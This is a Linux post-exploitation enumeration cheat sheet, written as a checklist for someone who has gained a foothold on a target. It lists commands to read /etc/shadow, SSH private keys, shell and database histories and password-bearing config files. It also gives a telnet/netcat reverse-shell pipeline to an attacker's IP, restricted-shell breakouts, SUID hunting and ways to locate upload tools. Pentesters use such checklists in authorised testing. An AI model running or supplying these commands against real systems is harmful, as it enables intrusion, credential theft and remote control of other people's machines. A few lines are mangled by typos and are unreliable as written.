
## OPERATING SYSTEM

### OPERATING SYSTEM

- cat /etc/issue
- cat /etc/*-release
- cat /etc/lsb-release
- cat /etc/redhat-release
### KERNEL VERSION
- cat /proc/version
- uname -a
- uname -mrs
- rpm -q kernel
- dmesg | grep Linux
l- s /boot | grep vmlinuz-
### WHAT CAN BE LEARNT FROM THE ENVIRONMENTAL VARIABLES?
- cat /etc/profile
- cat /etc/bashrc
- cat ~/.bash_profile
- cat ~/.bashrc
- cat ~/.bash_logout
- env
- set
### IS THERE A PRINTER?
- lpstat -a
## APPLICATIONS & SERVICES
### WHAT SERVICES ARE RUNNING? WHICH SERVICE HAS WHICH USER PRIVILEGE?
- ps aux
- ps -ef
- top
- cat /etc/services
### WHICH SERVICE(S) ARE BEEN RUNNING BY ROOT? OF THESE SERVICES, WHICH ARE VULNERABLE  - IT'S WORTH A DOUBLE CHECK!
- ps aux | grep root
- ps -ef | grep root
### WHAT APPLICATIONS ARE INSTALLED? WHAT VERSION ARE THEY? ARE THEY CURRENTLY RUNNING?
- ls -alh /usr/bin/
- ls -alh /sbin/
- dpkg -l
- rpm -qa
- ls -alh /var/cache/apt/archivesO
- ls -alh /var/cache/yum/
### ANY OF THE SERVICE(S) SETTINGS MISCONFIGURED? ARE ANY (VULNERABLE) PLUGINS ATTACHED?
- cat /etc/syslog.conf
- cat /etc/chttp.conf
- cat /etc/lighttpd.conf
- cat /etc/cups/cupsd.conf
- cat /etc/inetd.conf
- cat /etc/apache2/apache2.conf
- cat /etc/my.conf
- cat /etc/httpd/conf/httpd.conf
- cat /opt/lampp/etc/httpd.conf
- ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
### WHAT JOBS ARE SCHEDULED?
- crontab -l
- ls -alh /var/spool/cron
- ls -al /etc/ | grep cron
- ls -al /etc/cron*
- cat /etc/cron*
- cat /etc/at.allow
- cat /etc/at.deny
- cat /etc/cron.allow
- cat /etc/cron.deny
- cat /etc/crontab
- cat /etc/anacrontab
- cat /var/spool/cron/crontabs/root
## COMMUNICATIONS & NETWORKING
### ANY PLAIN TEXT USERNAMES AND/OR PASSWORDS?
- grep -i user [filename]
- grep -i pass [filename]
- grep -C 5 "password" [filename]
- find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" Joomla
### WHAT NIC(S) DOES THE SYSTEM HAVE? IS IT CONNECTED TO ANOTHER NETWORK?
- /sbin/ifconfig -a
- cat /etc/network/interfaces
- cat /etc/sysconfig/network
### WHAT ARE THE NETWORK CONFIGURATION SETTINGS? WHAT CAN YOU FIND OUT ABOUT THIS NETWORK? DHCP SERVER? DNS SERVER? GATEWAY?
- cat /etc/resolv.conf
- cat /etc/sysconfig/network
- cat /etc/networks
- iptables -L
- hostname
- dnsdomainname
### WHAT OTHER USERS & HOSTS ARE COMMUNICATING WITH THE SYSTEM?
- lsof -i
- lsof -i :80
- grep 80 /etc/services
- netstat -antup
- netstat -antpx
- netstat -tulpn
- chkconfig --list
- chkconfig --list | grep 3:on
- last
- w
### WHATS CACHED? IP AND/OR MAC ADDRESSES
- arp -e
- route
- /sbin/route -nee
### IS PACKET SNIFFING POSSIBLE? WHAT CAN BE SEEN? LISTEN TO LIVE TRAFFIC
- tcpdump  tcp  dst 192.168.1.7 80 and tcp  dst 10.5.5.252 21
### HAVE YOU GOT A SHELL? CAN YOU INTERACT WITH THE SYSTEM?
- nc -lvp 4444 Attacker. Input (Commands)
- nc -lvp 4445 Attacker. Ouput (Results)
- telnet [atackers  ip] 44444 | /bin/sh | [local ip] 44445 On the targets system. Use the attackers IP!
## CONFIDENTIAL INFORMATION & USERS
### WHO ARE YOU? WHO IS LOGGED IN? WHO HAS BEEN LOGGED IN? WHO ELSE IS THERE? WHO CAN DO WHAT?
- id
- who
- w
- last
- cat /etc/passwd | cut -d: -f1 List of users
- grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' List of super users
- awk -F: '($3 == "0") {print}' /etc/passwd List of super users
- cat /etc/sudoers
- sudo -l
### WHAT SENSITIVE FILES CAN BE FOUND?
- cat /etc/passwd
- cat /etc/group
- cat /etc/shadow
- ls -alh /var/mail/
### ANYTHING "INTERESTING" IN THE HOME DIRECTORIE(S)? IF IT'S POSSIBLE TO ACCESS
- ls -ahlR /root/
- ls -ahlR /home/
### ARE THERE ANY PASSWORDS IN; SCRIPTS, DATABASES, CONFIGURATION FILES OR LOG FILES? DEFAULT PATHS AND LOCATIONS FOR PASSWORDS
- cat /var/apache2/config.inc
- cat /var/lib/mysql/mysql/user.MYD
- cat /root/anaconda-ks.cfg
### WHAT HAS THE USER BEING DOING? IS THERE ANY PASSWORD IN PLAIN TEXT? WHAT HAVE THEY BEEN EDTING?
- cat ~/.bash_history
- cat ~/.nano_history
- cat ~/.atftp_history
- cat ~/.mysql_history
- cat ~/.php_history
### WHAT USER INFORMATION CAN BE FOUND?
- cat ~/.bashrc
- cat ~/.profile
- cat /var/mail/root
- cat /var/spool/mail/root
### CAN PRIVATE-KEY INFORMATION BE FOUND?
- cat ~/.ssh/authorized_keys
- cat ~/.ssh/identity.pub
- cat ~/.ssh/identity
- cat ~/.ssh/id_rsa.pub
- cat ~/.ssh/id_rsa
- cat ~/.ssh/id_dsa.pub
- cat ~/.ssh/id_dsa
- cat /etc/ssh/ssh_config
- cat /etc/ssh/sshd_config
- cat /etc/ssh/ssh_host_dsa_key.pub
- cat /etc/ssh/ssh_host_dsa_key
- cat /etc/ssh/ssh_host_rsa_key.pub
- cat /etc/ssh/ssh_host_rsa_key
- cat /etc/ssh/ssh_host_key.pub
- cat /etc/ssh/ssh_host_key

## FILE SYSTEMS
### WHICH CONFIGURATION FILES CAN BE WRITTEN IN /ETC/? ABLE TO RECONFIGURE A SERVICE?
- ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null Anyone
- ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null Owner
- ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null Group
- ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null Other
- find /etc/ -readable -type f 2>/dev/null Anyone
- find /etc/ -readable -type f -maxdepth 1 2>/dev/null Anyone
### WHAT CAN BE FOUND IN /VAR/ ?
- ls -alh /var/log
- ls -alh /var/mail
- ls -alh /var/spool
- ls -alh /var/spool/lpd
- ls -alh /var/lib/pgsql
- ls -alh /var/lib/mysql
- cat /var/lib/dhcp3/dhclient.leases
### ANY SETTINGS/FILES (HIDDEN) ON WEBSITE? ANY SETTINGS FILE WITH DATABASE INFORMATION?
- ls -alhR /var/www/
- ls -alhR /srv/www/htdocs/
- ls -alhR /usr/local/www/apache22/data/
- ls -alhR /opt/lampp/htdocs/
- ls -alhR /var/www/html/
### IS THERE ANYTHING IN THE LOG FILE(S) (COULD HELP WITH "LOCAL FILE INCLUDES"!)
- cat /etc/httpd/logs/access_log
- cat /etc/httpd/logs/access.log
- cat /etc/httpd/logs/error_log
- cat /etc/httpd/logs/error.log
- cat /var/log/apache2/access_log
- cat /var/log/apache2/access.log
- cat /var/log/apache2/error_log
- cat /var/log/apache2/error.log
- cat /var/log/apache/access_log
- cat /var/log/apache/access.log
- cat /var/log/auth.log
- cat /var/log/chttp.log
- cat /var/log/cups/error_log
- cat /var/log/dpkg.log
- cat /var/log/faillog
- cat /var/log/httpd/access_log
- cat /var/log/httpd/access.log
- cat /var/log/httpd/error_log
- cat /var/log/httpd/error.log
- cat /var/log/lastlog
- cat /var/log/lighttpd/access.log
- cat /var/log/lighttpd/error.log
- cat /var/log/lighttpd/lighttpd.access.log
- cat /var/log/lighttpd/lighttpd.error.log
- cat /var/log/messages
- cat /var/log/secure
- cat /var/log/syslog
- cat /var/log/wtmp
- cat /var/log/xferlog
- cat /var/log/yum.log
- cat /var/run/utmp
- cat /var/webmin/miniserv.log
- cat /var/www/logs/access_log
- cat /var/www/logs/access.log
- ls -alh /var/lib/dhcp3/
- ls -alh /var/log/postgresql/
- ls -alh /var/log/proftpd/
- ls -alh /var/log/samba/
Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp

### IF COMMANDS ARE LIMITED, YOU BREAK OUT OF THE "JAIL" SHELL?
- python -c 'import pty;pty.spawn("/bin/bash")'
- echo os.system('/bin/bash')
- /bin/sh -i
### HOW ARE FILE-SYSTEMS MOUNTED?
- mount
- df -h
### ARE THERE ANY UNMOUNTED FILE-SYSTEMS?
- cat /etc/fstab
### WHAT "ADVANCED LINUX FILE PERMISSIONS" ARE USED? STICKY BITS, SUID & GUID
-  find / -perm -1000 -type d 2>/dev/null Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
- find / -perm -g=s -type f 2>/dev/null SGID (chmod 2000) - run as the group, not the user who started it.
- find / -perm -u=s -type f 2>/dev/null SUID (chmod 4000) - run as the owner, not the user who started it.
- find / -perm -g=s -o -perm -u=s -type f 2>/dev/null SGID or SUID
- for i in `locate -r "bin$"`; do find $i  \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

### FIND STARTING AT ROOT (/), SGID OR SUID, NOT SYMBOLIC LINKS, ONLY 3 FOLDERS DEEP, LIST WITH MORE DETAIL AND HIDE ANY ERRORS (E.G. PERMISSION DENIED)

- find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

### WHERE CAN WRITTEN TO AND EXECUTED FROM? A FEW 'COMMON' PLACES: /TMP, /VAR/TMP, /DEV/SHM

- find / -writable -type d 2>/dev/null world-writeable folders
- find / -perm -222 -type d 2>/dev/null world-writeable folders
- find / -perm -o w -type d 2>/dev/null world-writeable folders
- find / -perm -o x -type d 2>/dev/null world-executable folders
- find / \( -perm -o w -perm -o x \) -type d 2>/dev/null world-writeable & executable folders

### ANY "PROBLEM" FILES? WORD-WRITEABLE, "NOBODY" FILES

- find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print world-writeable files
- find /dir -xdev  \( -nouser -o -nogroup \) -print Noowner files

## PREPARATION & FINDING EXPLOIT CODE

### WHAT DEVELOPMENT TOOLS/LANGUAGES ARE INSTALLED/SUPPORTED?

- find / -name perl*
- find / -name python*
- find / -name gcc*
- find / -name cc

### HOW CAN FILES BE UPLOADED?

- find / -name wget
- find / -name nc*
- find / -name netcat*
- find / -name tftp*
- find / -name ftp
